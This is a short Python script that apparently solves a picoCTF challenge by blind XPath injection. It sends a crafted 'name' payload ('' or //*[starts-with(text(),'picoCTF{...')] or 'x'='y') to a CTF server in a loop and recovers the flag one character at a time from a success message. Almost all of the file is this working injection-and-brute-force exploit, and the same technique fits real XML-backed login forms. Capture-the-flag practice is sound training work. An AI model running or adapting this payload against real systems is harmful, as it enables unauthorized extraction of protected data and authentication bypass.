import requests
import string

alphabet = string.printable #Set of all the ASCII characters & special characters. 

#examplePostRequest = requests.post('http://mercury.picoctf.net:53735', data = {"name":"' or //*[starts-with(text(),'picoCTF{')] or 'x'='y", "pass":"notRealPass"})
#the starts-with() function allows us to search for the XML file ( //* ) for any strings starting with picoCTF{ which turns true. We can then
#brute force all the combinations to build up the eventual words

continued = True
successSubstring = "You&#39;re on the right path."
exploitedStart = "' or //*[starts-with(text(),'picoCTF{"
exploitedEnd = "')] or 'x'='y"

for i in range(0,20):
	for char in alphabet:
		exploitedString = exploitedStart + char + exploitedEnd
		#print(exploitedString)
		httpReq = requests.post('http://mercury.picoctf.net:53735', data = {"name":exploitedString, "pass":"noRealPass"})
		if "You&#39;re on the right path." in httpReq.text:
			exploitedStart += char
			print(exploitedStart + " succeded")
			break
		else:
			print(exploitedStart + char +" failed")